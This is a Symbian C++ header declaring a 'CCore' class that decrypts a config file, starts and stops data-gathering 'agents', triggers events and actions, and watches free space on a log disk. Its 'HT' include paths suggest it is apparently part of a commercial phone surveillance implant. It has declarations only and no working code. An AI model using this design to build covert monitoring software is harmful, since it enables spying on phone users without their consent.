
#ifndef __CORE_H__
#define __CORE_H__

//  Include Files
#include "ConfigFile.h"
#include "MonitorFreeSpace.h"
#include "TonePlayer.h"
#include <e32base.h>
#include <HT\Logging.h>			// Logging
#include <HT\SharedQueue.h>		// RSharedQueue
#include <HT\PubSubObserver.h>	// CPubSubObserver
#include <HT\AbstractQueueEndPoint.h>
#include <HT\SharedQueueCliSrv.h>
#include <HT\AbstractEvent.h>


class CCore : public CAbstractQueueEndPoint, public MFreeSpaceCallBack
	{
public:
	static CCore* NewLC();
	virtual ~CCore();

	void LoadConfigAndStartL();
	/**
	 * Create a LOGTYPE_INFO log for startup event
	 */
	void LogInfoMsgL(const TDesC& aLogString);
	/**
	 * Create a markup for install time
	 */
	void WriteInstallTimeMarkupL();
	
	/**
	 * Start to monitor free space on disk
	 */
	void StartMonitorFreeSpace();
	
	/**
	 * Get iDemoVersion
	 */
	TBool DemoVersion();
	
	/**
	 * Creates a new Agent and Start it.
	 */
	void StartAgentL(TAgentType aAgentId);
			
	/**
	 * Stops the running Agent
	 */
	void StopAgentL(TAgentType aAgentId);
	
	/**
	 * Enable the event
	 */
	void EnableEventL(TInt aEventIdx);
	
	/**
	 * Disable the event
	 */
	void DisableEventL(TInt aEventIdx);
	
	
private: 
	// from CAbstractQueueEndPoint 
	virtual void PropertyChangedL(TUid category, TUint key, TInt value);

	// From MFreeSpaceCallBack
	virtual void NotifyAboveThreshold();
	virtual void NotifyBelowThreshold();
	    
private:
	
	/**
	 * Load a new config at run time
	 */
	void LoadNewConfigL();
	
	/**
	 * Deletes all the Completed Agents and the Completed Actions.
	 */
	void DisposeAgentsAndActionsL();
	
	/**
	 * Sends a "Restart" command to all the Agents
	 */
	//void RestartAllAgentsL();
	
	/*
	 * Sends a "Cycle" command to all agents working in append mode
	 */
	void CycleAppendingAgentsL();
	
	/**
	 * Stops all the running Agents and the Events
	 */
	void StopAllAgentsAndEventsL();
	
	/**
	 * From CAbstractQueueEndPoint:
	 * Will call the MarkCommandAsDispatchedL() when all has been completed.
	 */
	virtual void DispatchCommandL(TCmdStruct aCommand);
	
	/**
	 * Executes the Action
	 */
	void ExecuteActionL(TInt aQueueId, CDataAction* aAction);
	
		
	CCore();
	void ConstructL();

private:
	HBufC8* DecryptConfigFileL();

private:
	CConfigFile* iConfig;								// It is filled with the Config.bin data 
	RPointerArray<CAbstractQueueEndPoint> iEndPoints;	// List of all the Endpoints (agents or actions) which have been created by the CORE.
	RPointerArray<CAbstractEvent> iEvents;      // List of all the events created by the core
	CFreeSpaceMonitor*		iFreeSpaceMonitor;			// Monitor occupation on log disk (C:)
	RFs						iFs;
	CTonePlayer*			iTonePlayer;
	TBool					iDemoVersion;				// define if this is a demo version
	

	__FLOG_DECLARATION_MEMBER
	};

//  Function Prototypes

GLDEF_C TInt E32Main();

#endif  // __CORE_H__
